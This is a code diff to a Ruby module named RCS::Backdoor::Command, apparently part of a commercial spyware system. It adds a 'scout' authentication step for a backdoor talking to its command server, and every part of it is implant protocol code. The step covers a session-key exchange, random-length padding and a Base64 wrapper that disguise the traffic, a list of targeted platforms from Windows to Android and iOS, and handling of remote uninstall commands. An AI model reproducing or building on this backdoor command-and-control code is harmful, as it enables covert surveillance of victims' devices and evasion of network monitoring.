@@ -14,6 +14,7 @@ require 'rcs-common/pascalize'
 require 'ostruct'
 require 'securerandom'
 require 'digest/sha1'
+require 'base64'
 
 module RCS
 module Backdoor
@@ -39,12 +40,19 @@ module Command
   PROTO_PURGE          = 0x1a       # purge the log queue
   PROTO_EXEC           = 0x1b       # execution of commands during sync
 
+  PLATFORMS = ["WINDOWS", "WINMO", "OSX", "IOS", "BLACKBERRY", "SYMBIAN", "ANDROID", "LINUX"]
+
   # the commands are depicted here: http://rcs-dev/trac/wiki/RCS_Sync_Proto_Rest
+
+  def authenticate(backdoor)
+    # use the correct auth packet
+    backdoor.scout ? authenticate_scout(backdoor) : authenticate_elite(backdoor)
+  end
 
   # Authentication phase
   # ->  Crypt_C ( Kd, NonceDevice, BuildId, InstanceId, SubType, sha1 ( BuildId, InstanceId, SubType, Cb ) )   
   # <-  [ Crypt_C ( Ks ), Crypt_K ( NonceDevice, Response ) ]  |  SetCookie ( SessionCookie )  
-  def authenticate(backdoor)
+  def authenticate_elite(backdoor)
     trace :info, "AUTH"
      
     # first part of the session key, chosen by the client
@@ -118,11 +126,91 @@ module Command
     
     # print the response
     trace :info, "Auth Response: OK" if response.unpack('I') == [PROTO_OK]
-    if response.unpack('I') == [PROTO_UNINSTALL] then
+    if response.unpack('I') == [PROTO_UNINSTALL]
       trace :info, "UNINSTALL received"
       raise "UNINSTALL"
     end
-    if response.unpack('I') == [PROTO_NO] then
+    if response.unpack('I') == [PROTO_NO]
+      trace :info, "NO received"
+      raise "PROTO_NO: cannot continue"
+    end
+  end
+
+  # Authentication phase
+  # ->  Base64 ( Crypt_C ( Pver, Kd, sha(Kc | Kd), BuildId, InstanceId, Platform ) )
+  # <-  Base64 ( Crypt_C ( Ks, sha(K), Response ) )  |  SetCookie ( SessionCookie )
+  def authenticate_scout(backdoor)
+    trace :info, "AUTH SCOUT"
+
+    pver = [1].pack('I')
+
+    # first part of the session key, chosen by the client
+    # it will be used to derive the session key later along with Ks (server chosen)
+    # and the Cb (pre-shared conf key)
+    kd = SecureRandom.random_bytes(16)
+    trace :debug, "Auth -- Kd: " << kd.unpack('H*').to_s
+
+    # authentication sha
+    sha = Digest::SHA1.digest(backdoor.conf_key + kd)
+    trace :debug, "Auth -- sha: " << sha.unpack('H*').to_s
+
+    # the id and the type are padded to 16 bytes
+    rcs_id = backdoor.id.ljust(16, "\x00")
+    demo = (backdoor.type.end_with? '-DEMO') ? "\x01" : "\x00"
+    scout = "\x01"
+    flags = "\x00"
+
+    platform = [PLATFORMS.index(backdoor.type.gsub(/-DEMO/, ''))].pack('C') + demo + scout + flags
+
+    trace :debug, "Auth -- #{backdoor.type} " << platform.unpack('H*').to_s
+
+    # prepare and encrypt the message
+    message = pver + kd + sha + rcs_id + backdoor.instance + platform
+    #trace "Auth -- message: " << message.unpack('H*').to_s
+    enc_msg = aes_encrypt(message, backdoor.signature, PAD_NOPAD)
+    #trace "Auth -- signature: " << backdoor.signature.unpack('H*').to_s
+    #trace "Auth -- enc_message: " << enc_msg.unpack('H*').to_s
+
+    # add the random block
+    enc_msg += SecureRandom.random_bytes(rand(128..1024))
+
+    # add the base64 container
+    enc_msg = Base64.encode64(enc_msg)
+
+    # send the message and receive the response from the server
+    # the transport layer will take care of the underlying cookie
+    resp = @transport.message enc_msg
+
+    # remove the base64 container
+    resp = Base64.decode64(resp)
+
+    # align to the multiple of 16
+    resp = normalize(resp)
+
+    # decrypt the message
+    resp = aes_decrypt(resp, backdoor.conf_key, PAD_NOPAD)
+
+    ks = resp.slice!(0..15)
+    trace :debug, "Auth -- Ks: " << ks.unpack('H*').to_s
+
+    # calculate the session key ->  K = sha1(Cb || Ks || Kd)
+    # we use a schema like PBKDF1
+    # remember it for the entire session
+    @session_key = Digest::SHA1.digest(backdoor.conf_key + ks + kd)
+    trace :debug, "Auth -- K: " << @session_key.unpack('H*').to_s
+
+    check = resp.slice!(0..19)
+    raise "Invalid session key (K)" if check != Digest::SHA1.digest(@session_key + ks)
+
+    trace :debug, "Auth -- Response: " << resp.slice(0..3).unpack('H*').to_s
+
+    # print the response
+    trace :info, "Auth Response: OK" if resp.unpack('I') == [PROTO_OK]
+    if resp.unpack('I') == [PROTO_UNINSTALL]
+      trace :info, "UNINSTALL received"
+      raise "UNINSTALL"
+    end
+    if resp.unpack('I') == [PROTO_NO]
       trace :info, "NO received"
       raise "PROTO_NO: cannot continue"
     end
